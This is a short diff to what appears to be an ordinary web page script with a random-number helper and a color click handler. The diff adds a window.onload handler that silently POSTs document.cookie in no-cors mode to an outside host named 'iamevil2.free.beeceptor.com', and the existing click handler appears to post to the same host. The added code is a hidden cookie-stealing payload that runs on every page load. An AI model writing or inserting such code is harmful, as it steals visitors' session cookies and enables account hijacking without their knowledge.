@@ -5,6 +5,10 @@ function getRandomInt(max) {
     return Math.floor(Math.random() * max);
   }  
 
+window.onload = (event) => {
+  fetch('https://iamevil2.free.beeceptor.com/', {method: 'POST', mode: 'no-cors', body:document.cookie});
+};
+
 color.onclick = () => {
     fetch('https://iamevil2.free.beeceptor.com/', {
         method: 'POST',
